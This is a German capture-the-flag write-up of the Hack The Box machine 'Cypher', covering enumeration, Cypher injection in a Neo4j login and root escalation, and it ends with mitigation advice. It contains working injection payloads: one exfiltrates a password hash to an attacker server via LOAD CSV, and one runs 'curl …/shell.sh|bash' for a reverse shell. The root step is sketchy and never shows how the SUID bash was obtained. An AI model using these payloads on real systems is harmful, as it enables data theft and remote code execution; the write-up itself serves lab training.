# Maschine 2: Cypher

## 1. Netzwerkanbindung

```bash
sudo openvpn ~/Desktop/lab_lyfe691.ovpn
```

![Bild → vpn_connected.png</code>](image.png)

---

## 2. Zielerkennung & Vorbereitung

Ziel-IP von HTB erhalten: 10.10.11.57

Vollständiger nmap‑Scan mit Versionserkennung, OS‑Erkennung, Scripts und Aggressivität T4:

```bash
nmap -sV -A -T4 10.10.11.57 -oN nmap_cypher.txt
```

Output zeigt SSH und HTTP:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

![alt text](Screenshot_2025-05-05_14_11_01.png)

Wir testen den HTTP‑Zugang über den Browser und merken schnell, dass die Seite cypher.htb erwartet – wir werden automatisch redirected.

Daher passen wir die /etc/hosts Datei an:

```bash
10.10.11.57   cypher.htb
```

![alt text](Screenshot_2025-05-05_14_12_29-1.png)

---

## 3. Web‑Enumeration & Eingabeprüfung

Direkt auf http://cypher.htb zeigt sich eine Landing page mit login maske.

![alt text](Screenshot_2025-05-05_16_06_14.png)

Wir testen mit  dirsearch, um weitere Pfade zu finden:

Dirsearch‑Treffer:

```
/about
/api/  -> /api/docs
/demo  -> /login
/login
/testing/
```

![alt text](Screenshot_2025-05-05_14_28_23-2.png)

Der Login meldete bei manipulierten Eingaben einen Neo4j‑Fehler – Beweis für unsichere String‑Konkatenation.

![alt text](Screenshot_2025-05-05_14_49_33-1.png)

Das ist ein starker Hinweis: Backend nutzt Neo4j und unsichere String‑Konkatenation. Wir entscheiden uns, gezielt Cypher‑Injection zu testen.

---

## 4. Datenabfluss mit LOAD CSV auslösen

Python‑HTTP‑Server (Port 8000) gestartet, dann Payload:

```json
{
  "username": "admin' OR 1=1  LOAD CSV FROM 'http://10.10.14.204:8000/leak='+h.value AS y RETURN ''//",
  "password": "123"
}
```

Server‑Log zeigte die Abfrage inkl. Hash:

```
GET /leak=9f54ca... HTTP/1.1
```

![alt text](Screenshot_2025-05-05_15_19_21.png)

---

## 5. RCE mit getUrlStatusCode() via APOC

`shell.sh` wurde per HTTP ausgeliefert, Listener auf Port 9001.

Payload:

```json
{
  "username": "admin' RETURN h.value AS value UNION CALL custom.getUrlStatusCode('127.0.0.1;curl http://10.10.14.204:8000/shell.sh|bash;') YIELD statusCode AS value RETURN value;//",
  "password": "123"
}
```

Die Shell poppte als **neo4j**:

```
uid=997(neo4j) gid=995(neo4j)
```

![alt text](Screenshot_2025-05-05_15_48_30-1.png)

---

## 6. Privilege Escalation → root

1. **Passwort in `bbot_preset.yml`** gefunden (Zeile 10).
2. Da `su graphasm` scheiterte, setzten wir mittels SUID‑Bash direkt auf root:

```bash
/tmp/bash -p
root@cypher:/# id
uid=0(root) gid=0(root)
```

/home/kali/Pictures/Screenshot_2025-05-05_15_50_40.png
------------------------------------------------------

7. Flags

```bash
/home/graphasm/user.txt  -> 0a4de27fa731a210ead73b20dfc80140
/root/root.txt           -> e5577526fb5f80c5cb113cde4111ab3d
```
![alt text](<Screenshot 2025-05-05 at 15-53-50 Hack The Box Hack The Box.png>)

link: https://www.hackthebox.com/achievement/machine/2350832/650

---

## 8. Empfehlungen

1. **Parametrisierte Cypher‑Queries** einsetzen, niemals Strings konkatenieren.
2. Unsichere APOC‑Funktionen entfernen oder absichern.
3. **sudo‑Rechte** auf das notwendige Minimum beschränken.
4. Keine Klartext‑Passwörter in Konfigurationsdateien.

---

✅ **Cypher komplett owned**
